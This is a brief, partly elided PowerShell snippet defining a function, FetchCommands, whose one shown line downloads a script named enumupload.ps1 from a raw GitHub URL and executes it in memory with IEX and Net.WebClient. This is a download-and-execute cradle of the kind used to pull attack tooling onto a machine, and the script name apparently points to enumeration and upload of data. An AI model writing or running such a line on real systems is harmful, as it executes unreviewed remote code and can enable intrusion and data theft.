...
function FetchCommands
{
  ...
  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/enumupload.ps1'));
}
